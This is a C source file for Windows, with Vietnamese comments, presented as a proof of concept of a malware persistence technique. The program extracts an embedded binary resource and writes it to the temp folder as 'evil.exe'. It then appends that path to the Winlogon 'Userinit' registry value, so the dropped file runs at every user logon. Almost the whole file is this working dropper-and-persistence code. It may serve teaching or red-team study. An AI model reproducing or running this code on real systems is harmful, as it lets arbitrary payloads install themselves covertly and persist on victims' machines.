#include "registry.h"
#include "resource.h"
#include <tchar.h>
#include <Windows.h>
#pragma comment(lib, "User32.Lib")

#define MAX_SIZE_BUFFER_WRITTEN 1024

/*
** Mô tả:
** - Tiến trình winlogon.exe sẽ xử lý các tác vụ đăng nhập/đăng xuất.
** - Khi đăng nhập thành công: winlogon.exe sẽ khởi chạy userinit.exe (khởi tạo môi trường Desktop)
** - Tiến trình userinit.exe có thể được chạy bởi winlogon là vì nó đã tồn tại một registry key sau:
**		[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
**		"Userinit"="C:\\Windows\\system32\\userinit.exe,"
** - Tương tự userinit.exe có thể khởi tạo môi trường Explorer vì tồn tại một registry key sau:
**		[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
**		"Shell"="explorer.exe"
** PoC:
** - Malware sẽ lợi dụng kỹ thuật này để thêm đường dẫn đến tệp độc hại vào 1 trong 2 biến này (Userinit/Shell)
** Ref:
** 1. Reading And Writing Windows Registry Using WinAPI
**	https://aticleworld.com/reading-and-writing-windows-registry/
*/


int main()
{
	// *** Stage 1: Find and load resource ***
	HRSRC	hRes;			 // handle/ptr resource
	HGLOBAL	hResLoad;		 // handle to loaded resource
	LPVOID	lpResLock;		 // pointer to resource data

	// Locate the resource in file.
	printf(" [+] Finding resource.\n");
	Sleep(500);

	hRes = FindResourceA(
		NULL,		// locate resource current process
		101,		// name of resource (resource ID)
		"BIN");		// type of resource
	if (hRes == NULL) {
		printf(" [-] Could not locate resource. Error Code = %d\n", GetLastError());
		return;
	}

	// Load the resource into global memory.
	hResLoad = LoadResource(
		NULL,	// current process
		hRes);	// handle to the resource
	if (hResLoad == NULL) {
		printf(" [-] Could not load resource. Error Code = %d\n", GetLastError());
		return;
	}

	// Lock the resource into global memory.
	lpResLock = LockResource(hResLoad);
	if (lpResLock == NULL) {
		printf(" [-] Could not lock resource. Error Code = %d\n", GetLastError());
		return;
	}


	// *** Stage 2: Dropped/Extract/Write resource binary to file ***
	DWORD	dwSizeOfRes = 0;			// size (bytes) of the specified resource
	TCHAR	filePath[MAX_PATH];			// full path of file dropped
	TCHAR	lpTempPathBuffer[MAX_PATH];	// path of temp directory
	DWORD	dwRetVal = 0;				// temp variable

	printf(" [+] Dropping evil file.\n");
	Sleep(500);

	// Calculating size of resource
	dwSizeOfRes = SizeofResource(
		NULL,	// current process
		hRes);	// handle/ptr resource

	// Get the temp path env
	dwRetVal = GetTempPathW(
		MAX_PATH,          // length of the buffer
		lpTempPathBuffer); // buffer for path 
	if (dwRetVal > MAX_PATH || (dwRetVal == 0)) {
		printf(" [-] Could not get temp path. Error Code = %d\n", GetLastError());
		return;
	}

	// Generates a temporary file name.
	wsprintfW(filePath, TEXT("%sevil.exe"), lpTempPathBuffer);

	HANDLE	hFileWriter;
	DWORD	dwBytesWritten = 0;
	BOOL	bErrorFlag = FALSE;

	// Create dropped file
	hFileWriter = CreateFile(
		filePath,				// name of the write
		GENERIC_WRITE,			// open for writing
		NULL,					// do not share
		NULL,					// default security
		CREATE_ALWAYS,			// create new file, always
		FILE_ATTRIBUTE_NORMAL,	// normal file
		NULL);					// no attr. template
	if (hFileWriter == INVALID_HANDLE_VALUE) {
		printf(" [-] Terminal failure: Unable to open file \"%ls\" for write. Error Code = %d\n", filePath, GetLastError());
		return;
	}

	printf(" [+] Writing %d bytes to \"%ls\".\n", dwSizeOfRes, filePath);
	Sleep(500);

	bErrorFlag = WriteFile(
		hFileWriter,		// open file handle
		lpResLock,			// start of data to write
		dwSizeOfRes,		// number of bytes to write
		&dwBytesWritten,	// number of bytes that were written
		NULL);				// no overlapped structure
	if (FALSE == bErrorFlag) {
		printf(" [-] Terminal failure: Unable to write to \"%ls\". Error Code = %d\n", filePath, GetLastError());
	}
	else {
		if (dwBytesWritten != dwSizeOfRes) {
			printf(" [-] Error: dwBytesWritten != dwSizeOfRes. Error Code = %d\n", GetLastError());
		}
		else {
			printf(" [+] Wrote %d bytes to \"%ls\" successfully.\n", dwBytesWritten, filePath);
		}
	}
	CloseHandle(hFileWriter);

	/*
	** Stage 3: Persistence via Winlogon Registry
	** - Read/Write string from/to: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
	**   => 'Userinit' Or 'Shell'
	*/

	BOOL	status = FALSE;
	PWCHAR	bufferReaded = NULL;
	TCHAR	bufferWritten[MAX_SIZE_BUFFER_WRITTEN] = { 0 };

	Sleep(500);
	printf(" [+] Setting up Persistence via Winlogon Registry.\n");

	// Reading
	status = ReadStringFromRegistry(
		HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
		L"Userinit",
		&bufferReaded); // read string
	if (status != TRUE) {
		printf(" [-] Error read string from Registry. Code = %d\n", GetLastError());
		free(bufferReaded);
		bufferReaded = NULL;
		return;
	}

	if (strlen(bufferReaded) > MAX_SIZE_BUFFER_WRITTEN - strlen(filePath) - 3) {
		printf(" [-] Size Of bufferReaded too long.\n");
		free(bufferReaded);
		bufferReaded = NULL;
		return;
	}

	// Append executable path
	wsprintfW(bufferWritten, TEXT("%s,%s,"), bufferReaded, filePath);
	
	// Writing
	status = FALSE;
	status = WriteStringToRegistry(
		HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
		L"Userinit",
		(PWCHAR)bufferWritten); // write string
	if (status != TRUE) {
		printf(" [-] Error write string to Registry. Code = %d\n", GetLastError());
		return;
	}

	Sleep(500);
	printf(" [+] Successfully. Goodbye!\n");

	// Clean
	free(bufferReaded);
	bufferReaded = NULL;

	return 0;
}